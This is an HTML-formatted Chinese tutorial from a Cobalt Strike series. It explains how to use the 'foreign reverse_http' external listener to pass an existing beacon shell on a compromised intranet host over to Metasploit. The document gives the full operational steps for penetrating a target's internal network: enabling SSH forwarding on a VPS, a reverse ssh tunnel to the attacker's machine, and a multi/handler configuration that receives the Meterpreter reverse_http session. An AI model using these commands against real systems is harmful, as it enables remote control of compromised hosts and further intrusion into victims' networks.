<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="X52ecdac438509dd2c2019f30adfd411d1e39048"><span class="csB2D98684">windows/foreign/reverse_http [ </span><span class="cs83F14626">反向</span><span class="csB2D98684"> http </span><span class="cs83F14626">外部监听器</span><span class="csB2D98684"> ]</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">所谓的外部监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">说白点就是为了更方便的去配合其它的一些渗透工具进行协同渗透而设计的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">相信有些朋友可能对</span><span class="cs8926E06"> metasploit </span><span class="cs9C1B1871">或者</span><span class="cs8926E06"> empire [ </span><span class="cs9C1B1871">心里话</span><span class="cs8926E06">,</span><span class="cs9C1B1871">个人觉得它很垃圾</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也极少用</span><span class="cs8926E06">,</span><span class="cs9C1B1871">一般都直接是把里面的</span><span class="cs8926E06">powershell </span><span class="cs9C1B1871">脚本单独抠出来用</span><span class="cs8926E06"> ] </span><span class="cs9C1B1871">比较熟悉</span><span class="cs8926E06">,</span><span class="cs9C1B1871">平时可能也比较喜欢拿他们去做些内网渗透工作</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那么现在问题来了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我现在通过其它方式已经拿到了目标内网一台机器的</span><span class="cs8926E06"> beacon shell,</span><span class="cs9C1B1871">但由于</span><span class="cs8926E06"> CobaltStrike</span><span class="cs9C1B1871">自身内置的相关内网渗透功能太少</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我还是想用</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">或者</span><span class="cs8926E06"> empire </span><span class="cs9C1B1871">继续去渗透目标内网</span><span class="cs8926E06">,</span><span class="cs9C1B1871">该怎么办呢</span><span class="cs8926E06">? </span><span class="cs9C1B1871">这时候</span><span class="cs8926E06"> CobaltStrike </span><span class="cs9C1B1871">的外部监听器就开始发会作用了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们可以通过</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">内置的派生功能</span><span class="cs8926E06">,</span><span class="cs9C1B1871">直接通过</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道派生一个</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">到自己本地的</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">过程非常简单</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体操作如下</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">首先</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们需要先把本地和自己</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">的之间的</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道打通</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为等会儿要把派生的那个流量通过</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道直接转发到我本地</span><span class="cs8926E06">,</span><span class="cs9C1B1871">第一步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">连到自己的</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">编辑</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">服务配置文件开启</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">转发功能</span><span class="cs8926E06">,</span><span class="cs9C1B1871">之后重启</span><span class="cs8926E06"> ssh</span><span class="cs9C1B1871">服务</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处一定要记得重启服务之后它才能生效</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234"># egrep &quot;AllowTcpForwarding yes|GatewayPorts yes|TCPKeepAlive yes|PasswordAuthentication yes&quot; /etc/ssh/sshd_config</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image0.png" width="560" height="90" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">之后回到本地</span><span class="cs8926E06"> linux </span><span class="cs9C1B1871">机器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">开始尝试和自己的</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">建立</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并执行如下转发</span><span class="cs8926E06">[-R </span><span class="cs9C1B1871">即所谓的从远程转发到本地</span><span class="cs8926E06">],</span><span class="cs9C1B1871">下面这条</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">命令的意思就是通过</span><span class="cs8926E06"> 207.148.75.85[vps]</span><span class="cs9C1B1871">这台机器把来自外部的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口的流量都转发我们本地的</span><span class="cs8926E06"> 192.168.3.57 </span><span class="cs9C1B1871">这个地址的</span><span class="cs8926E06"> 8081 </span><span class="cs9C1B1871">端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这样一来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当别人去连</span><span class="cs8926E06"> 207.148.75.85 </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口就相当于直接连到了我本地的</span><span class="cs8926E06"> 192.168.3.57 </span><span class="cs9C1B1871">这个地址的</span><span class="cs8926E06"> 8081 </span><span class="cs9C1B1871">端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而本地的</span><span class="cs8926E06"> 192.168.3.57</span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8081 </span><span class="cs9C1B1871">端口又正好是我们事先准备好的</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这才直接导致了公网的</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">也可以直接在本地的</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">中上线</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.3.57:8081 root@207.148.75.85 -p 22</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ps -ef | grep &quot;192.168.3.57&quot;</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image1.png" width="560" height="95" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs8926E06">Ssh </span><span class="cs9C1B1871">隧道打通以后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">可以去</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">上看下端口到底有没有起来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不要弄了半天不上线</span><span class="cs8926E06">,</span><span class="cs9C1B1871">才发现原来端口都没起来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">岂不尴尬</span></p><p class="cs3A447A38"><span class="cs9FB05234"># netstat -tulnp</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image2.png" width="560" height="102" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">有了</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道</span><span class="cs8926E06">,</span><span class="cs9C1B1871">剩下的事情就很简单了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">新建一个外部监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">特别注意这个协议和端口</span><span class="cs8926E06">,</span><span class="cs9C1B1871">有很多人不上线都是因为这个协议不匹配或者端口弄错了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处我们用外部监听器中的</span><span class="cs8926E06"> reverse_http,</span><span class="cs9C1B1871">端口用</span><span class="cs8926E06"> 8080,</span><span class="cs9C1B1871">这儿既然用了</span><span class="cs8926E06"> http 8080,</span><span class="cs9C1B1871">那么后面的</span><span class="cs8926E06"> meterpreter payload </span><span class="cs9C1B1871">也一定要用</span><span class="cs8926E06"> http </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不然两边端口对不上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">协议又不匹配</span><span class="cs8926E06">,</span><span class="cs9C1B1871">数据无法实现交换</span><span class="cs8926E06">,</span><span class="cs9C1B1871">是不可能上线的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这个地方务必要特别仔细小心</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image3.png" width="560" height="237" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image4.png" width="560" height="67" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们现在想通过弹回来的这个</span><span class="cs8926E06"> beacon shell,</span><span class="cs9C1B1871">再弹回一个</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">好去进行内网渗透</span><span class="cs8926E06">,</span><span class="cs9C1B1871">就可以利用</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">内置的</span><span class="cs8926E06">&quot;spawn&quot;[</span><span class="cs9C1B1871">派生</span><span class="cs8926E06">]</span><span class="cs9C1B1871">功能</span><span class="cs8926E06">,</span><span class="cs9C1B1871">将其派生到指定的外部监听器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">刚才忘了说</span><span class="cs8926E06">,</span><span class="cs9C1B1871">外部监听器的流量不再是弹到自己的</span><span class="cs8926E06"> CobaltStrike </span><span class="cs9C1B1871">团队服务器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而是直接弹到指定的远程机器的指定端口上的</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image5.png" width="560" height="121" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_foreign_reverse_http%20[%20%e5%8f%8d%e5%90%91%20http%20%e5%a4%96%e9%83%a8%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image6.png" width="560" height="171" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">这样一来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当我们选择外部监听器进行派生时</span><span class="cs8926E06">,</span><span class="cs9C1B1871">流量就会被弹到我们指定的</span><span class="cs8926E06"> ip </span><span class="cs9C1B1871">和端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处是弹到我们</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而我们事先又已经通过</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道将</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口的流量直接转到了我本地的</span><span class="cs8926E06"> 192.168.3.57 </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8081 </span><span class="cs9C1B1871">端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以最终实现的效果便是来自己公网的</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">直接在自己本地上线了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不过相比正常弹回的</span><span class="cs8926E06"> meterpreter,</span><span class="cs9C1B1871">这样过来的</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">会明显感觉有些慢</span><span class="cs8926E06">,</span><span class="cs9C1B1871">另外</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这样做的好处就在于</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不会轻易的把</span><span class="cs8926E06"> beacon shell </span><span class="cs9C1B1871">给搞掉</span><span class="cs8926E06">,</span><span class="cs9C1B1871">更保险一点</span><span class="cs8926E06">,</span><span class="cs9C1B1871">实际效果如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf5 &gt; use exploit/multi/handler</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set payload windows/meterpreter/reverse_http</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set lhost 192.168.3.57</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set lport 8081</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; set exitonsession false</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; exploit -j</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 &gt; sessions -i 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">meterpreter &gt; sysinfo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">meterpreter &gt; getuid</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
